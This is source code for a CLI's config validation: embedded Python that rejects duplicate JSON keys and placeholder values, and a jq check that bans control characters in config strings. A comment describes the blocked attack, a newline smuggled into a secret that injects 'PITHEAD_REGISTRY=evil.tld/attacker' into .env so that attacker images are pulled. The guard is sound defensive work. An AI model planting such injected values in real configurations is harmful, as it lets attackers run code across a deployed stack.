# Check the raw document before jq can discard repeated members, or a config rewrite can
# hide them. The distributed CLI is self-contained, so this parser is embedded here.
config_document_error() { # <file> [request: check placeholders only in .config]
    python3 - "$1" "${2:-config}" <<'PYDOC'
import json


class _ObjectPairs(list):
    """Keep object members until their paths and duplicate keys have been checked."""


def _path(parent, key):
    key = json.dumps(key, ensure_ascii=True)[1:-1].replace('\\"', '"')
    return f"{parent}.{key}" if parent else key


def _decode(node, path=""):
    if isinstance(node, _ObjectPairs):
        result = {}
        for key, value in node:
            if key in result:
                location = path or "the top level"
                raise ValueError(
                    f"duplicate key {json.dumps(key)} at {location} "
                    f"(path {_path(path, key)})"
                )
            result[key] = _decode(value, _path(path, key))
        return result
    if isinstance(node, list):
        return [_decode(value, f"{path}[{index}]") for index, value in enumerate(node)]
    return node


def reject_placeholders(node, path=""):
    """Reject template instructions in every string leaf; never print its value."""
    if isinstance(node, dict):
        for key, value in node.items():
            reject_placeholders(value, _path(path, key))
    elif isinstance(node, list):
        for index, value in enumerate(node):
            reject_placeholders(value, f"{path}[{index}]")
    elif isinstance(node, str) and node.upper().startswith(("PASTE_", "YOUR_")):
        raise ValueError(f"placeholder value at {path or 'the top level'}")


def loads(text):
    """Decode JSON without silently replacing any repeated object member."""
    return _decode(json.loads(text, object_pairs_hook=_ObjectPairs))

import sys

try:
    with open(sys.argv[1], encoding="utf-8") as stream:
        document = loads(stream.read())
    candidate = document.get("config", {}) if sys.argv[2] == "request" and isinstance(document, dict) else document
    reject_placeholders(candidate)
except (OSError, ValueError, RecursionError) as exc:
    if isinstance(exc, json.JSONDecodeError):
        message = "not valid JSON"
    elif isinstance(exc, OSError):
        message = "could not read config document"
    elif isinstance(exc, RecursionError):
        message = "config document is nested too deeply"
    else:
        message = str(exc)
    # Paths are untrusted too: escape control characters rather than injecting terminal lines.
    print(message)
    sys.exit(1)
PYDOC
}

validate_config_document() {
    local reason
    command -v python3 >/dev/null 2>&1 || error "Config validation requires python3. Install it and retry."
    if ! reason=$(config_document_error "$CONFIG_FILE"); then
        error "Invalid configuration: $reason."
    fi
}

validate_config_control_characters() {
    # Central .env line-injection guard (#33 hardening). No config string value may carry a
    # control character (newline, CR, tab, …). A raw newline in a value that renders into .env
    # unquoted — e.g. monero.node_password, telegram.bot_token, workers.api_token — would inject
    # a SECOND KEY=value line such as PITHEAD_REGISTRY=evil.tld/attacker; every compose image: is
    # ${PITHEAD_REGISTRY:-…}, so the root `apply -y` would then pull attacker images for the whole
    # stack (RCE). Now that the dashboard control channel lets a full config cross the trust
    # boundary, these fields are attacker-influenceable. Check EVERY string leaf here — the shared
    # chokepoint both `apply --dry-run` (preview) and `apply -y` (commit) run — so no current or
    # future field is missed. No legitimate config value contains a control character.
    if jq -e 'any(.. | strings; test("[[:cntrl:]]"))' "$CONFIG_FILE" >/dev/null 2>&1; then
        error "$CONFIG_FILE has a config value containing a control character or newline. That is not allowed — it could inject an extra line into the stack's .env. Remove the newline/control character (check secrets like node_password, bot_token, api_token)."
    fi
}
